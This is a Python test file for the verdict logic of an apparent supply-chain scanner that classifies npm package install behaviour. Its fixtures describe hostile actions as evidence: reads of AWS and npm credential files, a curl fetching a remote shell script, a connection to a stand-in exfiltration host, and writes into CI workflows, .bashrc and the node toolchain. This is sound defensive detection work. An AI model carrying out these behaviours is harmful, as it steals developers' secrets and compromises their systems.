from redhanded.verdict import Evidence, Verdict, apply_model_opinion, decide


def test_clean_by_default():
    d = decide(Evidence())
    assert d.verdict == Verdict.CLEAN and d.reasons == ()


def test_exfiltrated_honeytoken_is_critical():
    d = decide(Evidence(exfil_matches=["aws_access_key_id"], bait_reads=["/home/dev/.aws/credentials"],
                        connects=["hooks.exfil-demo.invalid"]))
    assert d.verdict == Verdict.CRITICAL


def test_stolen_token_used_is_critical():
    assert decide(Evidence(token_uses=["npm publish"])).verdict == Verdict.CRITICAL


def test_bait_read_plus_network_is_high():
    d = decide(Evidence(bait_reads=["/home/dev/.npmrc"], connects=["1.2.3.4"]))
    assert d.verdict == Verdict.HIGH


def test_npm_lifecycle_shell_is_not_flagged():
    d = decide(Evidence(execs=[(["/bin/sh", "-c", "node-gyp rebuild"], True)]))
    assert d.verdict == Verdict.CLEAN


def test_curl_from_install_script_is_high():
    d = decide(Evidence(execs=[(["/usr/bin/curl", "-s", "http://x.invalid/p.sh"], False)]))
    assert d.verdict == Verdict.HIGH


def test_inline_node_alone_goes_to_review():
    assert decide(Evidence(execs=[(["node", "-e", "require('x')"], False)])).verdict == Verdict.REVIEW


def test_workflow_write_is_high():
    d = decide(Evidence(writes=["/work/repo/.github/workflows/ci.yml"]))
    assert d.verdict == Verdict.HIGH


def test_registry_download_alone_is_clean():
    assert decide(Evidence(connects=["registry.npmjs.org"])).verdict == Verdict.CLEAN


def test_unknown_host_is_review():
    assert decide(Evidence(connects=["telemetry.example.invalid"])).verdict == Verdict.REVIEW


def test_container_check_without_payload_requests_escalation():
    d = decide(Evidence(stats=["/.dockerenv"]))
    assert d.verdict == Verdict.REVIEW and d.container_aware


def test_container_check_with_payload_does_not_need_escalation():
    d = decide(Evidence(stats=["/.dockerenv"], exfil_matches=["github_token"]))
    assert d.verdict == Verdict.CRITICAL and not d.container_aware


def test_incomplete_scan_is_never_clean():
    assert decide(Evidence(incomplete=["inference unavailable"])).verdict == Verdict.REVIEW


def test_deadline_kill_is_review():
    assert decide(Evidence(deadline_killed=True)).verdict == Verdict.REVIEW


def test_model_can_raise_clean_to_review():
    assert apply_model_opinion(decide(Evidence()), "REVIEW").verdict == Verdict.REVIEW


def test_model_cannot_lower_a_verdict():
    d = decide(Evidence(exfil_matches=["npm_token"]))
    assert apply_model_opinion(d, "CLEAN").verdict == Verdict.CRITICAL


def test_deterministic():
    ev = Evidence(bait_reads=["/home/dev/.npmrc", "/home/dev/.aws/credentials"], connects=["b", "a"],
                  stats=["/.dockerenv"], writes=["/home/dev/.bashrc"])
    assert decide(ev) == decide(ev)


def test_writing_into_the_runtime_toolchain_is_high():
    d = decide(Evidence(writes=["/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js"]))
    assert d.verdict == Verdict.HIGH and "toolchain" in d.reasons[0]
